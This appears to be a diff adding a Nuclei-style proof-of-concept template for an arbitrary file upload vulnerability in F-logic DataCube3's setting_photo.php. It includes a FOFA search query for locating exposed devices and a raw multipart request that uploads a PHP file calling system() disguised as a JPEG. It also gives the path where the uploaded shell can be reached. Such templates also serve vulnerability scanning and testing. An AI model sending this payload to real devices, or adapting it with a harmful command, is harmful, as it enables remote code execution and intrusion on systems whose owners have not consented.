@@ -1,0 +1,90 @@
+id: poc-cs0bcylycfgc89rk
+info:
+  name: F-logic DataCube3 setting_photo.php 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cs0bcylycfgc89rk'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cs0bcylycfgc89rk
+    fofa: title=="DataCube3"
+http:
+- raw:
+  - 'POST /admin/setting_photo.php HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: keep-alive
+
+
+    Content-Type: multipart/form-data;boundary=---------------------------113389720123090127612523184396
+
+
+    Cookie: SESS_IDS=lbmi47rd8442eiu2kg6gg3e17p
+
+
+
+
+    -----------------------------113389720123090127612523184396
+
+
+    Content-Disposition: form-data; name="add"
+
+
+
+
+    .............................
+
+
+    -----------------------------113389720123090127612523184396
+
+
+    Content-Disposition: form-data; name="addPhoto"; filename="dudesite.php"
+
+
+    Content-Type: image/jpeg
+
+
+
+
+    <?php system("echo dudesite");?>
+
+
+    -----------------------------113389720123090127612523184396
+
+
+    Content-Disposition: form-data; name="accesstime"
+
+
+
+
+    0.85628800 1710984011
+
+
+    -----------------------------113389720123090127612523184396--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /images/slideshow/dudesite.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
